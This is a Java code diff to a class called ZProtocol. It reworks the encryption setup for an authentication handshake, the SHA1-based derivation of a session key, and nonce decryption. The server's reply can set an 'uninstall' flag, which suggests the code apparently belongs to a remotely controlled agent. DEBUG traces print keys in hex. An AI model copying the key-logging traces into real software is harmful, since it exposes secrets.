@@ -43,7 +43,8 @@ public class ZProtocol extends Protocol {
     //#endif
 
     private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
-    private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5();
+    private final Encryption cryptoConf = new Encryption(Encryption.getKeys()
+            .getProtoKey());
 
     byte[] Kd = new byte[16];
     byte[] Nonce = new byte[16];
@@ -58,7 +59,7 @@ public class ZProtocol extends Protocol {
         //#endif
 
         // key init
-        cryptoConf.makeKey(Encryption.getKeys().getProtoKey());
+        //cryptoConf.makeKey(Encryption.getKeys().getProtoKey());
         RandomSource.getBytes(Kd);
         RandomSource.getBytes(Nonce);
 
@@ -73,9 +74,10 @@ public class ZProtocol extends Protocol {
 
             //#ifdef DEBUG
             debug.info("***** Authentication *****");
+
             //#endif          
 
-            byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
+            byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication(), 0);
             byte[] response = transport.command(cypherOut);
             Status.self().uninstall = parseAuthentication(response);
 
@@ -291,18 +293,20 @@ public class ZProtocol extends Protocol {
         byte[] cypherKs = new byte[32];
         Utils.copy(cypherKs, authResult, cypherKs.length);
         try {
+
             byte[] Ks = cryptoConf.decryptData(cypherKs);
 
             //#ifdef DEBUG
             debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
             debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
+
             //#endif
 
             //PBKDF1 (SHA1, c=1, Salt=KS||Kd) 
             final SHA1Digest digest = new SHA1Digest();
             digest.update(Encryption.getKeys().getConfKey());
-            digest.update(Ks);
-            digest.update(Kd);
+            digest.update(Ks, 0, 16);
+            digest.update(Kd, 0, 16);
 
             byte[] K = new byte[16];
             Utils.copy(K, digest.getDigest(), K.length);
@@ -317,7 +321,10 @@ public class ZProtocol extends Protocol {
             byte[] cypherNonceCap = new byte[32];
             Utils.copy(cypherNonceCap, 0, authResult, 32, cypherNonceCap.length);
 
-            byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
+            Encryption crypto2 = new Encryption(K);
+            byte[] plainNonceCap = crypto2.decryptData(cypherNonceCap);
+            crypto2 = null;
+
             //#ifdef DEBUG
             debug.trace("decodeAuth plainNonceCap="
                     + Utils.byteArrayToHex(plainNonceCap));
